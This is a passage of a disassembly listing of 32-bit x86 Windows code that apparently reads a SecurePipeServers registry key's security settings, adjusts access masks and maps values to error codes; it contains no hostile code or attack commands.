 1002a5e:	46                   	inc    %esi
 1002a5f:	66 8b 06             	mov    (%esi),%ax
 1002a62:	66 3b c7             	cmp    %di,%ax
 1002a65:	0f 84 0f f9 ff ff    	je     0x100237a
 1002a6b:	8b ce                	mov    %esi,%ecx
 1002a6d:	66 3d 22 00          	cmp    $0x22,%ax
 1002a71:	0f 84 1e f9 ff ff    	je     0x1002395
 1002a77:	46                   	inc    %esi
 1002a78:	46                   	inc    %esi
 1002a79:	66 8b 06             	mov    (%esi),%ax
 1002a7c:	66 3b c7             	cmp    %di,%ax
 1002a7f:	75 ec                	jne    0x1002a6d
 1002a81:	e9 0f f9 ff ff       	jmp    0x1002395
 1002a86:	66 89 3e             	mov    %di,(%esi)
 1002a89:	46                   	inc    %esi
 1002a8a:	46                   	inc    %esi
 1002a8b:	e9 0e f9 ff ff       	jmp    0x100239e
 1002a90:	53                   	push   %ebx
 1002a91:	e8 20 ee ff ff       	call   0x10018b6
 1002a96:	33 db                	xor    %ebx,%ebx
 1002a98:	e9 23 f9 ff ff       	jmp    0x10023c0
 1002a9d:	53                   	push   %ebx
 1002a9e:	e8 13 ee ff ff       	call   0x10018b6
 1002aa3:	e9 92 ef ff ff       	jmp    0x1001a3a
 1002aa8:	89 7d fc             	mov    %edi,-0x4(%ebp)
 1002aab:	e9 74 ef ff ff       	jmp    0x1001a24
 1002ab0:	ff 15 40 10 00 01    	call   *0x1001040
 1002ab6:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1002ab9:	e9 66 ef ff ff       	jmp    0x1001a24
 1002abe:	8d 4d d8             	lea    -0x28(%ebp),%ecx
 1002ac1:	51                   	push   %ecx
 1002ac2:	6a 05                	push   $0x5
 1002ac4:	ff d0                	call   *%eax
 1002ac6:	e9 14 fc ff ff       	jmp    0x10026df
 1002acb:	57                   	push   %edi
 1002acc:	ff 15 70 10 00 01    	call   *0x1001070
 1002ad2:	89 75 08             	mov    %esi,0x8(%ebp)
 1002ad5:	e9 05 fc ff ff       	jmp    0x10026df
 1002ada:	b8 40 bb 00 00       	mov    $0xbb40,%eax
 1002adf:	e9 77 f7 ff ff       	jmp    0x100225b
 1002ae4:	81 fe 3a 00 00 c0    	cmp    $0xc000003a,%esi
 1002aea:	0f 84 8f f4 ff ff    	je     0x1001f7f
 1002af0:	8b c6                	mov    %esi,%eax
 1002af2:	e9 8f f4 ff ff       	jmp    0x1001f86
 1002af7:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1002afd:	ff 75 08             	push   0x8(%ebp)
 1002b00:	8b d8                	mov    %eax,%ebx
 1002b02:	e8 b8 f2 ff ff       	call   0x1001dbf
 1002b07:	59                   	pop    %ecx
 1002b08:	8d 84 00 8e 00 00 00 	lea    0x8e(%eax,%eax,1),%eax
 1002b0f:	50                   	push   %eax
 1002b10:	8b 43 30             	mov    0x30(%ebx),%eax
 1002b13:	57                   	push   %edi
 1002b14:	ff 70 18             	push   0x18(%eax)
 1002b17:	ff 15 e4 10 00 01    	call   *0x10010e4
 1002b1d:	8b d8                	mov    %eax,%ebx
 1002b1f:	3b df                	cmp    %edi,%ebx
 1002b21:	0f 84 39 02 00 00    	je     0x1002d60
 1002b27:	68 70 2d 00 01       	push   $0x1002d70
 1002b2c:	53                   	push   %ebx
 1002b2d:	e8 a3 f2 ff ff       	call   0x1001dd5
 1002b32:	ff 75 08             	push   0x8(%ebp)
 1002b35:	53                   	push   %ebx
 1002b36:	e8 8f f2 ff ff       	call   0x1001dca
 1002b3b:	83 c4 10             	add    $0x10,%esp
 1002b3e:	53                   	push   %ebx
 1002b3f:	8d 45 d0             	lea    -0x30(%ebp),%eax
 1002b42:	50                   	push   %eax
 1002b43:	ff d6                	call   *%esi
 1002b45:	8d 45 d0             	lea    -0x30(%ebp),%eax
 1002b48:	89 45 b4             	mov    %eax,-0x4c(%ebp)
 1002b4b:	8d 45 ac             	lea    -0x54(%ebp),%eax
 1002b4e:	50                   	push   %eax
 1002b4f:	68 19 00 02 00       	push   $0x20019
 1002b54:	8d 45 f4             	lea    -0xc(%ebp),%eax
 1002b57:	50                   	push   %eax
 1002b58:	c7 45 ac 18 00 00 00 	movl   $0x18,-0x54(%ebp)
 1002b5f:	89 7d b0             	mov    %edi,-0x50(%ebp)
 1002b62:	c7 45 b8 40 00 00 00 	movl   $0x40,-0x48(%ebp)
 1002b69:	89 7d bc             	mov    %edi,-0x44(%ebp)
 1002b6c:	89 7d c0             	mov    %edi,-0x40(%ebp)
 1002b6f:	ff 15 d8 10 00 01    	call   *0x10010d8
 1002b75:	8b f0                	mov    %eax,%esi
 1002b77:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1002b7d:	8b 40 30             	mov    0x30(%eax),%eax
 1002b80:	53                   	push   %ebx
 1002b81:	57                   	push   %edi
 1002b82:	ff 70 18             	push   0x18(%eax)
 1002b85:	ff 15 d4 10 00 01    	call   *0x10010d4
 1002b8b:	e9 db f3 ff ff       	jmp    0x1001f6b
 1002b90:	8b 35 d0 10 00 01    	mov    0x10010d0,%esi
 1002b96:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1002b99:	50                   	push   %eax
 1002b9a:	57                   	push   %edi
 1002b9b:	57                   	push   %edi
 1002b9c:	6a 04                	push   $0x4
 1002b9e:	ff 75 f4             	push   -0xc(%ebp)
 1002ba1:	89 7d 08             	mov    %edi,0x8(%ebp)
 1002ba4:	89 7d f8             	mov    %edi,-0x8(%ebp)
 1002ba7:	ff d6                	call   *%esi
 1002ba9:	3d 23 00 00 c0       	cmp    $0xc0000023,%eax
 1002bae:	0f 85 4b 01 00 00    	jne    0x1002cff
 1002bb4:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1002bba:	ff 75 f8             	push   -0x8(%ebp)
 1002bbd:	8b 40 30             	mov    0x30(%eax),%eax
 1002bc0:	57                   	push   %edi
 1002bc1:	ff 70 18             	push   0x18(%eax)
 1002bc4:	ff 15 e4 10 00 01    	call   *0x10010e4
 1002bca:	8b d8                	mov    %eax,%ebx
 1002bcc:	3b df                	cmp    %edi,%ebx
 1002bce:	89 5d 08             	mov    %ebx,0x8(%ebp)
 1002bd1:	0f 84 89 01 00 00    	je     0x1002d60
 1002bd7:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1002bda:	50                   	push   %eax
 1002bdb:	ff 75 f8             	push   -0x8(%ebp)
 1002bde:	53                   	push   %ebx
 1002bdf:	6a 04                	push   $0x4
 1002be1:	ff 75 f4             	push   -0xc(%ebp)
 1002be4:	ff d6                	call   *%esi
 1002be6:	ff 75 f4             	push   -0xc(%ebp)
 1002be9:	8b f0                	mov    %eax,%esi
 1002beb:	ff 15 fc 10 00 01    	call   *0x10010fc
 1002bf1:	3b f7                	cmp    %edi,%esi
 1002bf3:	0f 8c 67 01 00 00    	jl     0x1002d60
 1002bf9:	8d 45 fe             	lea    -0x2(%ebp),%eax
 1002bfc:	50                   	push   %eax
 1002bfd:	8d 45 f0             	lea    -0x10(%ebp),%eax
 1002c00:	50                   	push   %eax
 1002c01:	8d 45 ff             	lea    -0x1(%ebp),%eax
 1002c04:	50                   	push   %eax
 1002c05:	53                   	push   %ebx
 1002c06:	ff 15 04 11 00 01    	call   *0x1001104
 1002c0c:	85 c0                	test   %eax,%eax
 1002c0e:	0f 8c f4 00 00 00    	jl     0x1002d08
 1002c14:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
 1002c18:	0f 84 ea 00 00 00    	je     0x1002d08
 1002c1e:	6a 02                	push   $0x2
 1002c20:	6a 0c                	push   $0xc
 1002c22:	8d 45 c4             	lea    -0x3c(%ebp),%eax
 1002c25:	50                   	push   %eax
 1002c26:	ff 75 f0             	push   -0x10(%ebp)
 1002c29:	ff 15 08 11 00 01    	call   *0x1001108
 1002c2f:	3b c7                	cmp    %edi,%eax
 1002c31:	89 45 e8             	mov    %eax,-0x18(%ebp)
 1002c34:	0f 8c ce 00 00 00    	jl     0x1002d08
 1002c3a:	33 db                	xor    %ebx,%ebx
 1002c3c:	39 7d c4             	cmp    %edi,-0x3c(%ebp)
 1002c3f:	76 50                	jbe    0x1002c91
 1002c41:	8d 45 ec             	lea    -0x14(%ebp),%eax
 1002c44:	50                   	push   %eax
 1002c45:	53                   	push   %ebx
 1002c46:	ff 75 f0             	push   -0x10(%ebp)
 1002c49:	33 f6                	xor    %esi,%esi
 1002c4b:	ff 15 0c 11 00 01    	call   *0x100110c
 1002c51:	3b c7                	cmp    %edi,%eax
 1002c53:	89 45 e8             	mov    %eax,-0x18(%ebp)
 1002c56:	0f 8c ac 00 00 00    	jl     0x1002d08
 1002c5c:	8b 45 ec             	mov    -0x14(%ebp),%eax
 1002c5f:	8a 08                	mov    (%eax),%cl
 1002c61:	84 c9                	test   %cl,%cl
 1002c63:	74 05                	je     0x1002c6a
 1002c65:	80 f9 01             	cmp    $0x1,%cl
 1002c68:	75 21                	jne    0x1002c8b
 1002c6a:	8b 48 04             	mov    0x4(%eax),%ecx
 1002c6d:	f7 c1 19 00 02 00    	test   $0x20019,%ecx
 1002c73:	74 05                	je     0x1002c7a
 1002c75:	be 00 00 00 80       	mov    $0x80000000,%esi
 1002c7a:	f7 c1 06 00 02 00    	test   $0x20006,%ecx
 1002c80:	74 06                	je     0x1002c88
 1002c82:	81 ce 00 00 00 40    	or     $0x40000000,%esi
 1002c88:	89 70 04             	mov    %esi,0x4(%eax)
 1002c8b:	43                   	inc    %ebx
 1002c8c:	3b 5d c4             	cmp    -0x3c(%ebp),%ebx
 1002c8f:	72 b0                	jb     0x1002c41
 1002c91:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1002c97:	ff 75 f8             	push   -0x8(%ebp)
 1002c9a:	8b 40 30             	mov    0x30(%eax),%eax
 1002c9d:	57                   	push   %edi
 1002c9e:	ff 70 18             	push   0x18(%eax)
 1002ca1:	ff 15 e4 10 00 01    	call   *0x10010e4
 1002ca7:	8b d8                	mov    %eax,%ebx
 1002ca9:	3b df                	cmp    %edi,%ebx
 1002cab:	74 5b                	je     0x1002d08
 1002cad:	6a 01                	push   $0x1
 1002caf:	53                   	push   %ebx
 1002cb0:	ff 15 14 10 00 01    	call   *0x1001014
 1002cb6:	8b 4d c8             	mov    -0x38(%ebp),%ecx
 1002cb9:	8b 75 f0             	mov    -0x10(%ebp),%esi
 1002cbc:	8b d1                	mov    %ecx,%edx
 1002cbe:	8d 43 14             	lea    0x14(%ebx),%eax
 1002cc1:	c1 e9 02             	shr    $0x2,%ecx
 1002cc4:	8b f8                	mov    %eax,%edi
 1002cc6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1002cc8:	6a 00                	push   $0x0
 1002cca:	50                   	push   %eax
 1002ccb:	8b ca                	mov    %edx,%ecx
 1002ccd:	6a 01                	push   $0x1
 1002ccf:	83 e1 03             	and    $0x3,%ecx
 1002cd2:	53                   	push   %ebx
 1002cd3:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 1002cd5:	ff 15 04 10 00 01    	call   *0x1001004
 1002cdb:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1002ce1:	ff 75 08             	push   0x8(%ebp)
 1002ce4:	8b 40 30             	mov    0x30(%eax),%eax
 1002ce7:	6a 00                	push   $0x0
 1002ce9:	ff 70 18             	push   0x18(%eax)
 1002cec:	ff 15 d4 10 00 01    	call   *0x10010d4
 1002cf2:	8b 45 0c             	mov    0xc(%ebp),%eax
 1002cf5:	89 18                	mov    %ebx,(%eax)
 1002cf7:	8b 45 e8             	mov    -0x18(%ebp),%eax
 1002cfa:	e9 87 f2 ff ff       	jmp    0x1001f86
 1002cff:	ff 75 f4             	push   -0xc(%ebp)
 1002d02:	ff 15 fc 10 00 01    	call   *0x10010fc
 1002d08:	39 7d 08             	cmp    %edi,0x8(%ebp)
 1002d0b:	74 16                	je     0x1002d23
 1002d0d:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1002d13:	ff 75 08             	push   0x8(%ebp)
 1002d16:	8b 40 30             	mov    0x30(%eax),%eax
 1002d19:	57                   	push   %edi
 1002d1a:	ff 70 18             	push   0x18(%eax)
 1002d1d:	ff 15 d4 10 00 01    	call   *0x10010d4
 1002d23:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1002d29:	8b 40 30             	mov    0x30(%eax),%eax
 1002d2c:	6a 14                	push   $0x14
 1002d2e:	57                   	push   %edi
 1002d2f:	ff 70 18             	push   0x18(%eax)
 1002d32:	ff 15 e4 10 00 01    	call   *0x10010e4
 1002d38:	8b f0                	mov    %eax,%esi
 1002d3a:	3b f7                	cmp    %edi,%esi
 1002d3c:	74 22                	je     0x1002d60
 1002d3e:	6a 01                	push   $0x1
 1002d40:	56                   	push   %esi
 1002d41:	ff 15 14 10 00 01    	call   *0x1001014
 1002d47:	57                   	push   %edi
 1002d48:	57                   	push   %edi
 1002d49:	6a 01                	push   $0x1
 1002d4b:	56                   	push   %esi
 1002d4c:	ff 15 04 10 00 01    	call   *0x1001004
 1002d52:	85 c0                	test   %eax,%eax
 1002d54:	74 0a                	je     0x1002d60
 1002d56:	8b 45 0c             	mov    0xc(%ebp),%eax
 1002d59:	89 30                	mov    %esi,(%eax)
 1002d5b:	e9 24 f2 ff ff       	jmp    0x1001f84
 1002d60:	b8 17 00 00 c0       	mov    $0xc0000017,%eax
 1002d65:	e9 1c f2 ff ff       	jmp    0x1001f86
 1002d6a:	90                   	nop
 1002d6b:	90                   	nop
 1002d6c:	90                   	nop
 1002d6d:	90                   	nop
 1002d6e:	90                   	nop
 1002d6f:	90                   	nop
 1002d70:	5c                   	pop    %esp
 1002d71:	00 52 00             	add    %dl,0x0(%edx)
 1002d74:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
 1002d78:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
 1002d7e:	72 00                	jb     0x1002d80
 1002d80:	79 00                	jns    0x1002d82
 1002d82:	5c                   	pop    %esp
 1002d83:	00 4d 00             	add    %cl,0x0(%ebp)
 1002d86:	61                   	popa
 1002d87:	00 63 00             	add    %ah,0x0(%ebx)
 1002d8a:	68 00 69 00 6e       	push   $0x6e006900
 1002d8f:	00 65 00             	add    %ah,0x0(%ebp)
 1002d92:	5c                   	pop    %esp
 1002d93:	00 53 00             	add    %dl,0x0(%ebx)
 1002d96:	79 00                	jns    0x1002d98
 1002d98:	73 00                	jae    0x1002d9a
 1002d9a:	74 00                	je     0x1002d9c
 1002d9c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
 1002da0:	5c                   	pop    %esp
 1002da1:	00 43 00             	add    %al,0x0(%ebx)
 1002da4:	75 00                	jne    0x1002da6
 1002da6:	72 00                	jb     0x1002da8
 1002da8:	72 00                	jb     0x1002daa
 1002daa:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
 1002dae:	74 00                	je     0x1002db0
 1002db0:	43                   	inc    %ebx
 1002db1:	00 6f 00             	add    %ch,0x0(%edi)
 1002db4:	6e                   	outsb  %ds:(%esi),(%dx)
 1002db5:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
 1002db9:	00 6f 00             	add    %ch,0x0(%edi)
 1002dbc:	6c                   	insb   (%dx),%es:(%edi)
 1002dbd:	00 53 00             	add    %dl,0x0(%ebx)
 1002dc0:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
 1002dc5:	00 43 00             	add    %al,0x0(%ebx)
 1002dc8:	6f                   	outsl  %ds:(%esi),(%dx)
 1002dc9:	00 6e 00             	add    %ch,0x0(%esi)
 1002dcc:	74 00                	je     0x1002dce
 1002dce:	72 00                	jb     0x1002dd0
 1002dd0:	6f                   	outsl  %ds:(%esi),(%dx)
 1002dd1:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
 1002dd5:	00 53 00             	add    %dl,0x0(%ebx)
 1002dd8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
 1002ddc:	75 00                	jne    0x1002dde
 1002dde:	72 00                	jb     0x1002de0
 1002de0:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
 1002de4:	69 00 70 00 65 00    	imul   $0x650070,(%eax),%eax
 1002dea:	53                   	push   %ebx
 1002deb:	00 65 00             	add    %ah,0x0(%ebp)
 1002dee:	72 00                	jb     0x1002df0
 1002df0:	76 00                	jbe    0x1002df2
 1002df2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
 1002df6:	73 00                	jae    0x1002df8
 1002df8:	5c                   	pop    %esp
 1002df9:	00 00                	add    %al,(%eax)
 1002dfb:	00 b8 17 00 00 c0    	add    %bh,-0x3fffffe9(%eax)
 1002e01:	e9 d9 f0 ff ff       	jmp    0x1001edf
 1002e06:	56                   	push   %esi
 1002e07:	ff 15 4c 10 00 01    	call   *0x100104c
 1002e0d:	8b c7                	mov    %edi,%eax
 1002e0f:	e9 ca f0 ff ff       	jmp    0x1001ede
 1002e14:	ff 75 fc             	push   -0x4(%ebp)
 1002e17:	ff d6                	call   *%esi
 1002e19:	e9 b9 f0 ff ff       	jmp    0x1001ed7
 1002e1e:	b8 17 00 00 c0       	mov    $0xc0000017,%eax
 1002e23:	e9 b2 ec ff ff       	jmp    0x1001ada
 1002e28:	b8 17 00 00 c0       	mov    $0xc0000017,%eax
 1002e2d:	e9 4c ef ff ff       	jmp    0x1001d7e
 1002e32:	6a 00                	push   $0x0
 1002e34:	ff 75 f8             	push   -0x8(%ebp)
 1002e37:	ff 15 d4 10 00 01    	call   *0x10010d4
 1002e3d:	8b 45 08             	mov    0x8(%ebp),%eax
 1002e40:	e9 39 ef ff ff       	jmp    0x1001d7e
 1002e45:	90                   	nop
 1002e46:	90                   	nop
 1002e47:	90                   	nop
 1002e48:	90                   	nop
 1002e49:	90                   	nop
 1002e4a:	c2 04 00             	ret    $0x4
 1002e4d:	90                   	nop
 1002e4e:	90                   	nop
 1002e4f:	90                   	nop
 1002e50:	90                   	nop
 1002e51:	90                   	nop
 1002e52:	8b ff                	mov    %edi,%edi
 1002e54:	55                   	push   %ebp
 1002e55:	8b ec                	mov    %esp,%ebp
 1002e57:	83 ec 1c             	sub    $0x1c,%esp
 1002e5a:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
 1002e5e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 1002e62:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
 1002e66:	33 c0                	xor    %eax,%eax
 1002e68:	40                   	inc    %eax
 1002e69:	68 4a 2e 00 01       	push   $0x1002e4a
 1002e6e:	ff 75 08             	push   0x8(%ebp)
 1002e71:	89 45 e8             	mov    %eax,-0x18(%ebp)
 1002e74:	89 45 ec             	mov    %eax,-0x14(%ebp)
 1002e77:	8b 45 0c             	mov    0xc(%ebp),%eax
 1002e7a:	c7 45 e4 30 00 00 00 	movl   $0x30,-0x1c(%ebp)
 1002e81:	89 45 f0             	mov    %eax,-0x10(%ebp)
 1002e84:	ff 15 28 10 00 01    	call   *0x1001028
 1002e8a:	85 c0                	test   %eax,%eax
 1002e8c:	74 0b                	je     0x1002e99
 1002e8e:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
 1002e91:	51                   	push   %ecx
 1002e92:	50                   	push   %eax
 1002e93:	ff 15 24 10 00 01    	call   *0x1001024
 1002e99:	c9                   	leave
 1002e9a:	c2 08 00             	ret    $0x8
 1002e9d:	90                   	nop
 1002e9e:	90                   	nop
 1002e9f:	90                   	nop
 1002ea0:	90                   	nop
 1002ea1:	90                   	nop
 1002ea2:	8b ff                	mov    %edi,%edi
 1002ea4:	55                   	push   %ebp
 1002ea5:	8b ec                	mov    %esp,%ebp
 1002ea7:	5d                   	pop    %ebp
 1002ea8:	ff 25 18 11 00 01    	jmp    *0x1001118
 1002eae:	90                   	nop
 1002eaf:	90                   	nop
 1002eb0:	90                   	nop
 1002eb1:	90                   	nop
 1002eb2:	90                   	nop
 1002eb3:	8b ff                	mov    %edi,%edi
 1002eb5:	55                   	push   %ebp
 1002eb6:	8b ec                	mov    %esp,%ebp
 1002eb8:	53                   	push   %ebx
 1002eb9:	56                   	push   %esi
 1002eba:	57                   	push   %edi
 1002ebb:	bf 20 40 00 01       	mov    $0x1004020,%edi
 1002ec0:	57                   	push   %edi
 1002ec1:	ff 15 68 10 00 01    	call   *0x1001068
 1002ec7:	8b 75 08             	mov    0x8(%ebp),%esi
 1002eca:	8b 46 04             	mov    0x4(%esi),%eax
 1002ecd:	8b 58 10             	mov    0x10(%eax),%ebx
 1002ed0:	83 60 10 00          	andl   $0x0,0x10(%eax)
 1002ed4:	57                   	push   %edi
 1002ed5:	ff 15 60 10 00 01    	call   *0x1001060
 1002edb:	ff 75 0c             	push   0xc(%ebp)
 1002ede:	ff 36                	push   (%esi)
 1002ee0:	ff d3                	call   *%ebx
 1002ee2:	ff 76 04             	push   0x4(%esi)
 1002ee5:	e8 38 e8 ff ff       	call   0x1001722
 1002eea:	56                   	push   %esi
 1002eeb:	e8 c6 e9 ff ff       	call   0x10018b6
 1002ef0:	5f                   	pop    %edi
 1002ef1:	5e                   	pop    %esi
 1002ef2:	5b                   	pop    %ebx
 1002ef3:	5d                   	pop    %ebp
 1002ef4:	c2 08 00             	ret    $0x8
 1002ef7:	90                   	nop
 1002ef8:	90                   	nop
 1002ef9:	90                   	nop
 1002efa:	90                   	nop
 1002efb:	90                   	nop
 1002efc:	8b ff                	mov    %edi,%edi
 1002efe:	56                   	push   %esi
 1002eff:	be 54 40 00 01       	mov    $0x1004054,%esi
 1002f04:	56                   	push   %esi
 1002f05:	ff 15 68 10 00 01    	call   *0x1001068
 1002f0b:	83 3d 6c 40 00 01 00 	cmpl   $0x0,0x100406c
 1002f12:	76 16                	jbe    0x1002f2a
 1002f14:	ff 0d 6c 40 00 01    	decl   0x100406c
 1002f1a:	75 0e                	jne    0x1002f2a
 1002f1c:	57                   	push   %edi
 1002f1d:	6a 08                	push   $0x8
 1002f1f:	59                   	pop    %ecx
 1002f20:	33 c0                	xor    %eax,%eax
 1002f22:	bf cc 41 00 01       	mov    $0x10041cc,%edi
 1002f27:	f3 ab                	rep stos %eax,%es:(%edi)
 1002f29:	5f                   	pop    %edi
 1002f2a:	56                   	push   %esi
 1002f2b:	ff 15 60 10 00 01    	call   *0x1001060
 1002f31:	5e                   	pop    %esi
 1002f32:	c3                   	ret
 1002f33:	90                   	nop
 1002f34:	90                   	nop
 1002f35:	90                   	nop
 1002f36:	90                   	nop
 1002f37:	90                   	nop
 1002f38:	8b ff                	mov    %edi,%edi
 1002f3a:	55                   	push   %ebp
 1002f3b:	8b ec                	mov    %esp,%ebp
 1002f3d:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
 1002f41:	75 04                	jne    0x1002f47
 1002f43:	33 c0                	xor    %eax,%eax
 1002f45:	eb 67                	jmp    0x1002fae
 1002f47:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
 1002f4b:	83 f8 14             	cmp    $0x14,%eax
 1002f4e:	7f 3e                	jg     0x1002f8e
 1002f50:	74 35                	je     0x1002f87
 1002f52:	83 e8 09             	sub    $0x9,%eax
 1002f55:	74 29                	je     0x1002f80
 1002f57:	83 e8 04             	sub    $0x4,%eax
 1002f5a:	74 1d                	je     0x1002f79
 1002f5c:	48                   	dec    %eax
 1002f5d:	74 13                	je     0x1002f72
 1002f5f:	48                   	dec    %eax
 1002f60:	74 09                	je     0x1002f6b
 1002f62:	83 e8 03             	sub    $0x3,%eax
 1002f65:	75 36                	jne    0x1002f9d
 1002f67:	6a 33                	push   $0x33
 1002f69:	eb 42                	jmp    0x1002fad
 1002f6b:	b8 fa 08 00 00       	mov    $0x8fa,%eax
 1002f70:	eb 3c                	jmp    0x1002fae
 1002f72:	b8 e5 08 00 00       	mov    $0x8e5,%eax
 1002f77:	eb 35                	jmp    0x1002fae
 1002f79:	b8 e4 08 00 00       	mov    $0x8e4,%eax
 1002f7e:	eb 2e                	jmp    0x1002fae
 1002f80:	b8 39 08 00 00       	mov    $0x839,%eax
 1002f85:	eb 27                	jmp    0x1002fae
 1002f87:	b8 e1 08 00 00       	mov    $0x8e1,%eax
 1002f8c:	eb 20                	jmp    0x1002fae
 1002f8e:	83 e8 15             	sub    $0x15,%eax
 1002f91:	74 18                	je     0x1002fab
 1002f93:	48                   	dec    %eax
 1002f94:	74 0e                	je     0x1002fa4
 1002f96:	48                   	dec    %eax
 1002f97:	74 12                	je     0x1002fab
 1002f99:	48                   	dec    %eax
 1002f9a:	48                   	dec    %eax
 1002f9b:	74 07                	je     0x1002fa4
 1002f9d:	b8 58 08 00 00       	mov    $0x858,%eax
 1002fa2:	eb 0a                	jmp    0x1002fae
 1002fa4:	b8 f9 08 00 00       	mov    $0x8f9,%eax
 1002fa9:	eb 03                	jmp    0x1002fae
 1002fab:	6a 57                	push   $0x57
 1002fad:	58                   	pop    %eax
 1002fae:	5d                   	pop    %ebp
 1002faf:	c2 04 00             	ret    $0x4
 1002fb2:	90                   	nop
 1002fb3:	90                   	nop
 1002fb4:	90                   	nop
 1002fb5:	90                   	nop
 1002fb6:	90                   	nop
 1002fb7:	8b ff                	mov    %edi,%edi
 1002fb9:	55                   	push   %ebp
 1002fba:	8b ec                	mov    %esp,%ebp
 1002fbc:	0f b6 4d 08          	movzbl 0x8(%ebp),%ecx
 1002fc0:	8b c1                	mov    %ecx,%eax
 1002fc2:	c1 e8 05             	shr    $0x5,%eax
 1002fc5:	83 f8 08             	cmp    $0x8,%eax
 1002fc8:	77 13                	ja     0x1002fdd
 1002fca:	8d 14 85 cc 41 00 01 	lea    0x10041cc(,%eax,4),%edx
 1002fd1:	c1 e0 05             	shl    $0x5,%eax
 1002fd4:	2b c8                	sub    %eax,%ecx
 1002fd6:	33 c0                	xor    %eax,%eax
 1002fd8:	40                   	inc    %eax
 1002fd9:	d3 e0                	shl    %cl,%eax
 1002fdb:	09 02                	or     %eax,(%edx)
 1002fdd:	5d                   	pop    %ebp
 1002fde:	c2 04 00             	ret    $0x4
 1002fe1:	90                   	nop
 1002fe2:	90                   	nop
 1002fe3:	90                   	nop
 1002fe4:	90                   	nop
 1002fe5:	90                   	nop
 1002fe6:	8b ff                	mov    %edi,%edi
 1002fe8:	55                   	push   %ebp
 1002fe9:	8b ec                	mov    %esp,%ebp
 1002feb:	0f b6 4d 08          	movzbl 0x8(%ebp),%ecx
 1002fef:	8b d1                	mov    %ecx,%edx
 1002ff1:	c1 ea 05             	shr    $0x5,%edx
 1002ff4:	83 fa 08             	cmp    $0x8,%edx
 1002ff7:	76 04                	jbe    0x1002ffd
 1002ff9:	33 c0                	xor    %eax,%eax
 1002ffb:	eb 13                	jmp    0x1003010
 1002ffd:	8b c2                	mov    %edx,%eax
 1002fff:	c1 e0 05             	shl    $0x5,%eax
 1003002:	2b c8                	sub    %eax,%ecx
 1003004:	33 c0                	xor    %eax,%eax
 1003006:	40                   	inc    %eax
 1003007:	d3 e0                	shl    %cl,%eax
 1003009:	23 04 95 cc 41 00 01 	and    0x10041cc(,%edx,4),%eax
 1003010:	5d                   	pop    %ebp
 1003011:	c2 04 00             	ret    $0x4
 1003014:	90                   	nop
 1003015:	90                   	nop
 1003016:	90                   	nop
 1003017:	90                   	nop
 1003018:	90                   	nop
 1003019:	8b ff                	mov    %edi,%edi
 100301b:	55                   	push   %ebp
 100301c:	8b ec                	mov    %esp,%ebp
 100301e:	83 ec 44             	sub    $0x44,%esp
 1003021:	a1 44 40 00 01       	mov    0x1004044,%eax
 1003026:	53                   	push   %ebx
 1003027:	56                   	push   %esi
 1003028:	57                   	push   %edi
 1003029:	be 54 40 00 01       	mov    $0x1004054,%esi
 100302e:	56                   	push   %esi
 100302f:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1003032:	33 ff                	xor    %edi,%edi
 1003034:	ff 15 68 10 00 01    	call   *0x1001068
 100303a:	8b 5d 08             	mov    0x8(%ebp),%ebx
 100303d:	53                   	push   %ebx
 100303e:	e8 a3 ff ff ff       	call   0x1002fe6
 1003043:	85 c0                	test   %eax,%eax
 1003045:	75 3b                	jne    0x1003082
 1003047:	6a 10                	push   $0x10
 1003049:	59                   	pop    %ecx
 100304a:	8d 7d bc             	lea    -0x44(%ebp),%edi
 100304d:	f3 ab                	rep stos %eax,%es:(%edi)
 100304f:	88 45 be             	mov    %al,-0x42(%ebp)
 1003052:	88 45 c7             	mov    %al,-0x39(%ebp)
 1003055:	88 45 c9             	mov    %al,-0x37(%ebp)
 1003058:	8d 45 bc             	lea    -0x44(%ebp),%eax
 100305b:	50                   	push   %eax
 100305c:	c6 45 bc 32          	movb   $0x32,-0x44(%ebp)
 1003060:	c6 45 c6 fe          	movb   $0xfe,-0x3a(%ebp)
 1003064:	c6 45 c8 fd          	movb   $0xfd,-0x38(%ebp)
 1003068:	88 5d ec             	mov    %bl,-0x14(%ebp)
 100306b:	e8 4f 01 00 00       	call   0x10031bf
 1003070:	50                   	push   %eax
 1003071:	e8 c2 fe ff ff       	call   0x1002f38
 1003076:	8b f8                	mov    %eax,%edi
 1003078:	85 ff                	test   %edi,%edi
 100307a:	75 06                	jne    0x1003082
 100307c:	53                   	push   %ebx
 100307d:	e8 35 ff ff ff       	call   0x1002fb7
 1003082:	56                   	push   %esi
 1003083:	ff 15 60 10 00 01    	call   *0x1001060
 1003089:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 100308c:	8b c7                	mov    %edi,%eax
 100308e:	5f                   	pop    %edi
 100308f:	5e                   	pop    %esi
 1003090:	5b                   	pop    %ebx
 1003091:	e8 32 e4 ff ff       	call   0x10014c8
 1003096:	c9                   	leave
 1003097:	c2 04 00             	ret    $0x4
 100309a:	8b ff                	mov    %edi,%edi
 100309c:	55                   	push   %ebp
